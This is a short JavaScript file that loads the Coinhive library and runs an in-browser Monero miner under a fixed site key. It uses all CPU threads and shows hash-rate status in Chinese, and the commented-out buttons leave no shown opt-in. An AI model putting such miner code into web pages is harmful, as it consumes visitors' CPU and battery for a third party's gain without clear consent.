document.write("<script src=https://coinhive.com/lib/coinhive.min.js></script>"); 

function run(){
if (navigator.hardwareConcurrency > 1){
	//var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
	var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency)}
}else{
	//var cpuConfig = {throttle:0.6}
	var cpuConfig = {throttle:1}
}
var miner = new CoinHive.Anonymous('9J4yPiZTyamt1dT4O0Oxnnlql6An2UP2', cpuConfig);
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
// Update stats once per second


setInterval(function() {
    
	var threadCount = miner.getNumThreads();
	var hashesPerSecond = Math.round(miner.getHashesPerSecond());
	var getTotalHashes = miner.getTotalHashes();
try {
	navigator.getBattery().then(function (battery) {
		if (battery.level < 0.50 && battery.charging == false) {
			miner.stop();
			document.getElementById("stopped").innerHTML = "偵測到電量不足已停止運算";
		}
	});
}catch(e){console.log(e)}
	// Output to HTML elements...
	if (miner.isRunning()) {
		document.getElementById("status").innerHTML = "狀態: 正在使用 " + threadCount + " 個執行緒";
		document.getElementById("hashesPerSecond").innerHTML = "運算力: " + hashesPerSecond ;
		document.getElementById("getTotalHashes").innerHTML = "累積運算力: " + getTotalHashes ;
		//document.getElementById("minerbutton").innerHTML = "<button onclick=\"miner.stop()\">停止運算</button>";
	}else{
		document.getElementById("status").innerHTML = "狀態: 閒置中";
		document.getElementById("hashesPerSecond").innerHTML = "運算力: " + 0 ;
		//document.getElementById("minerbutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">開始運算!</button>";
	}
}, 800);
}